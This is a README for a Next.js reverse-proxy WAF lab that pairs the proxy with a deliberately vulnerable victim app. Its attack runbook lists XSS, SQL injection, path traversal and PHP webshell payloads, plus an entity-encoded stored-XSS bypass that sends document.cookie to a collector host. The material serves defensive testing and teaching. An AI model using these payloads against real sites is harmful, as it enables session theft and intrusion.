# ShieldForge – Reverse-Proxy WAF Lab

A Next.js reverse proxy with a synchronous rule WAF, rate limiting, and an async ML-assisted detection layer.  
Includes a deliberately vulnerable victim app (login, chat, search, profile, file viewer, PHP lab) so you can see the proxy block or log real attack payloads.

---

## Quick Start (Local, Path-Prefix Mode)

```bash
# 1. Install deps (both projects)
cd proxy && npm install
cd ../victim-app && npm install
cd ..

# 2. Start the victim on its own port (prefix /t/victim-shop)
cd victim-app
NEXT_PUBLIC_BASE_PATH=/t/victim-shop npm run dev -- -p 4000
# → http://localhost:4000/t/victim-shop

# 3. In another terminal, start the proxy
cd ../proxy
# Allow private origins for the local victim
ALLOW_PRIVATE_ORIGINS=true npm run dev
# → http://localhost:3000

# 4. Open the dashboard and add the victim origin
#    Dashboard → Registered origins → "Add origin"
#    Origin URL: http://127.0.0.1:4000/t/victim-shop
#    Path prefix: /t/victim-shop
#    Name: Victim Shop
#    (Click "Add origin" – the proxy probes it and adds it in-memory)

# 5. Run the Test Lab presets against /t/victim-shop
#    Select "Victim Shop" in the Target origin dropdown, then click:
#      • Normal GET
#      • XSS in query string
#      • SQLi in POST body
#      • Path traversal
#      • PHP webshell body
#      • Rate limit burst
#      • Weak victim session cookie
#      • Stored XSS bypass (entity-encoded) — expects 200; open /chat to see it fire
```

---

## Quick Start (Local, Host-Routing Mode)

Host routing lets the victim keep its own `/api/*` and `/_next/*` paths without colliding with the proxy’s control plane.

```bash
# 1. /etc/hosts (requires sudo)
echo "127.0.0.1 victim.local" | sudo tee -a /etc/hosts

# 2. Victim runs at root (no basePath) on a different port
cd victim-app
npm run dev:host    # NEXT_PUBLIC_BASE_PATH= npm run dev -- -p 4001
# → http://victim.local:4001

# 3. Proxy with CONTROL_HOSTS so it knows which host is the control plane
cd ../proxy
CONTROL_HOSTS=localhost:3000,127.0.0.1:3000 \
ALLOW_PRIVATE_ORIGINS=true \
npm run dev
# → http://localhost:3000 (control plane)
#    http://victim.local:3000 (proxies to victim on :4001)

# 4. Add the host origin in the dashboard
#    Origin URL: http://127.0.0.1:4001
#    Host: victim.local
#    (Path prefix is auto-derived as /t/victim-local)
```

---

## Attack Runbook (What to Try)

| Vector | Payload | Where to Send | Expected Result |
|--------|---------|---------------|-----------------|
| **Reflected XSS (query)** | `<script>alert(1)</script>` | `GET /t/victim-shop?q=...` | **403** – `xss-script-tag` |
| **Reflected XSS (body)** | `<img src=x onerror=alert(1)>` | `POST /t/victim-shop/api/login` | **403** – `xss-event-handler` |
| **SQLi (tautology)** | `' OR 1=1--` | `POST /t/victim-shop/api/login` | **403** – `sqli-tautology` |
| **SQLi (bypass)** | `' OR 'a'='a` | `POST /t/victim-shop/api/login` | **200/303** – proxy misses, victim simulates admin login |
| **Path traversal** | `../../etc/passwd` | `GET /t/victim-shop/files?name=...` | **403** – `path-traversal` |
| **PHP webshell** | `<?php system('id'); ?>` | `POST /t/victim-shop/api/php` | **403** – `php-shell-function` |
| **Scanner UA** | `sqlmap/1.0` | Any request | **403** – `scanner-user-agent` |
| **Rate limit** | 60 rapid HEADs | `HEAD /t/victim-shop/` | **429** after 50 in 20s |
| **Weak cookie** | (login) | `POST /t/victim-shop/api/login` | Event shows `httponly=false` |
| **Stored XSS (bypass)** | `<details open ontoggle&#61;"new Image().src&#61;'http://localhost:4100/collect?c='+encodeURIComponent(document.cookie)">` | `POST /t/victim-shop/api/comment` | **200** – stored; open `/t/victim-shop/chat` to trigger exfil (requires attacker on `:4100`) |

> **Note on the stored-XSS bypass** – The proxy intentionally does **not** scan response bodies. The entity-encoded `ontoggle&#61;` slips past the request-only rules; the vulnerable victim decodes entities before `dangerouslySetInnerHTML`. This is a documented gap. In hardened mode the victim escapes output, so the payload renders harmless.

---

## Dashboard – What You See

| Panel | Purpose |
|-------|---------|
| **Test Lab** | One-click presets for every attack vector above. Results show PASS/FAIL, status, latency, and the matched rule. |
| **Live Event Stream** | In-memory feed of every proxied request: rule hit, ML classification (mock/fallback), cookie flags, missing security headers, upstream latency. |
| **Registered Origins** | List of active origins (static + runtime). Click **Open ↗** to visit the proxied path. |
| **Add Origin** | Paste a target URL; the proxy probes it, validates SSRF, and adds it at runtime. Shows a warning that runtime origins reset on restart – on Vercel you must set `ORIGINS_JSON`. |
| **Custom Request** | Ad-hoc request builder (method, path, body) sent through the proxy. |
| **Policy** | Current enforce/shadow thresholds. |

---

## Vercel Deployment (Production Build)

### 1. Victim App

```bash
cd victim-app
# Build with the prefix that the proxy will mount it under
NEXT_PUBLIC_BASE_PATH=/t/victim-shop npm run build
# Deploy to Vercel (CLI or dashboard)
npx vercel --prod
# Note the deployment URL, e.g. https://victim-shop-abc123.vercel.app
```

### 2. Proxy

```bash
cd proxy
npm run build
# Deploy
npx vercel --prod
# Note the proxy URL, e.g. https://shieldforge-proxy-xyz.vercel.app
```

### 3. Wire Them Together

In the proxy Vercel project **Settings → Environment Variables**, add:

| Variable | Value |
|----------|-------|
| `ALLOW_PRIVATE_ORIGINS` | `false` |
| `ORIGINS_JSON` | JSON string (see below) |
| `CONTROL_HOSTS` | `your-proxy.vercel.app` (the proxy’s own host) |
| `PROXY_CONTROL_ORIGIN` | `https://your-proxy.vercel.app` |
| `USE_REAL_ML` | `false` (or `true` + `ML_SERVICE_URL` when Part 2 is ready) |
| `WRITE_TO_SUPABASE` | `false` (or `true` + keys when you have a DB) |

**Example `ORIGINS_JSON` (single line, escape quotes):**
```json
[{"path_prefix":"/t/victim-shop","origin_url":"https://victim-shop-abc123.vercel.app/t/victim-shop","origin_id":"victim-shop-1","name":"Victim Shop (Vercel)","description":"Deployed victim app"}]
```

### 4. Verify on Vercel

1. Open `https://your-proxy.vercel.app/dashboard`  
2. The origin should show as active (green pill).  
3. Run the Test Lab presets against `/t/victim-shop`.  
4. Open `https://your-proxy.vercel.app/t/victim-shop/chat` in a browser – the victim loads through the proxy.  
5. Try the attacker payloads from the runbook; check the event stream for 403s and flag recordings.

---

## Architecture Summary

| Layer | File | Responsibility |
|-------|------|----------------|
| **Edge Middleware** | `middleware.ts` | Rate limit (IP + host/prefix), rule WAF on path/query/UA, host-vs-prefix routing, rewrite victim hosts → `/_proxy/*` |
| **Node Catch-All** | `app/[[...path]]/route.ts` | Body inspection, upstream fetch, cookie/header rewrite, `after()` async emit |
| **Host Proxy Route** | `app/_proxy/[[...path]]/route.ts` | Same handler, host-matched origin, no public prefix |
| **Origin Registry** | `lib/origins.ts` | Static (`config/origins.json`, `ORIGINS_JSON`) + runtime (`globalThis`) merge, SSRF guard, host + prefix match |
| **WAF Rules** | `lib/waf.ts` | Regex list: XSS tags/handlers, SQLi, traversal, webshell, scanner UA |
| **Cookie Inspection** | `lib/cookies.ts` | Flags only (HttpOnly, Secure, SameSite) – values never stored |
| **ML Boundary** | `lib/emit.ts` | Mock classifier; swap with `USE_REAL_ML=true` + `ML_SERVICE_URL` (no proxy code change) |
| **Dashboard** | `app/dashboard/Dashboard.tsx` | Live SSE-like poll, presets, origin CRUD, custom request |

---

## Known Limits (Honest Gaps)

1. **Response-side XSS** – The proxy never scans HTML bodies. A stored payload that bypasses request rules (entity-encoded `ontoggle&#61;`) will execute when the victim renders it. Hardened victim mode fixes this by escaping.
2. **Direct Origin Access** – If you visit the victim’s Vercel URL directly, the proxy is bypassed. Lock the origin to the proxy’s IP range or use Vercel Authentication for true protection.
3. **In-Memory State** – Events, rate limits, runtime origins, and victim messages live in process memory. Vercel cold starts reset them. Use `ORIGINS_JSON` + external DB for production.
4. **No Real PHP Execution** – The victim’s `/api/php` only simulates output. The WAF rules still get realistic `<?php … ?>` bodies to inspect.
5. **Single-Process Rate Limit** – Works for the demo; a real deployment needs a distributed counter (Redis/Upstash).

---

## Project Structure

```
.
├── proxy/                 # Next.js reverse proxy (this README’s main focus)
│   ├── app/
│   │   ├── [[...path]]/route.ts     # Path-prefix proxy handler
│   │   ├── _proxy/[[...path]]/route.ts  # Host-mode proxy handler
│   │   ├── dashboard/               # Control panel (React)
│   │   └── api/…                    # /dashboard/events, /internal/events, /origins
│   ├── lib/
│   │   ├── origins.ts               # Registry + SSRF guard
│   │   ├── waf.ts                   # Rule list
│   │   ├── proxy-handler.ts         # Shared data plane
│   │   ├── hosts.ts                 # Control-host detection
│   │   └── … (cookies, rate-limit, emit, blocklist, etc.)
│   ├── middleware.ts                # Edge: rate limit + WAF + host rewrite
│   ├── config/origins.json          # Default static origins
│   ├── scripts/acceptance-test.mjs  # 13 automated checks
│   └── .env.example
├── victim-app/            # Deliberately vulnerable Next.js demo site
│   ├── app/
│   │   ├── page.tsx              # Login (weak cookie, reflected password)
│   │   ├── chat/                 # Stored comments, raw HTML in vulnerable mode
│   │   ├── search/               # Reflected query + naive SQLi filter
│   │   ├── files/                # Simulated traversal sink (fake /etc/passwd)
│   │   ├── php/                  # Simulated PHP endpoint
│   │   ├── profile/              # Client-side cookie probe
│   │   └── api/…                 # login, comment, file, php, log, reset
│   ├── lib/{config,store,html,http}.ts
│   └── .env.example
└── README.md                # This file
```

---

## License

MIT – demo code for learning purposes only. Do not use the vulnerable victim app in production.